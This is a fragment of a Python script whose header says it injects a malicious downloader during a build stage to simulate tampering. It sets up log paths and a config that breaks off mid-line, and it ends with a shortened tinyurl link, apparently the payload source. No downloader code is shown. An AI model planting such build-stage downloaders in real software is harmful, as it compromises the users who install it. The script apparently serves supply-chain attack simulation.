'''
 # @ Create Time: 2025-08-13 11:48:28
 # @ Modified time: 2025-08-13 14:18:05
 # @ Description: inject a malicious downloader during build stage, to simulate tampering
 '''

from __future__ import annotations
import json, os, time, hashlib, base64, urllib.request, urllib.parse
from pathlib import Path
from typing import Any, Dict, List

ART = Path("artifact")


LOG = Path("logs")
LOG.mkdir(exist_ok=True, parents=True)
AUDIT = LOG.joinpath("installer_audit.log")
RUN = LOG.joinpath("installer_run.log")

# ------- Config -----------
# comma-separated list of allowed
ALLOWED_

link = "https://tinyurl.com/2acl9edo"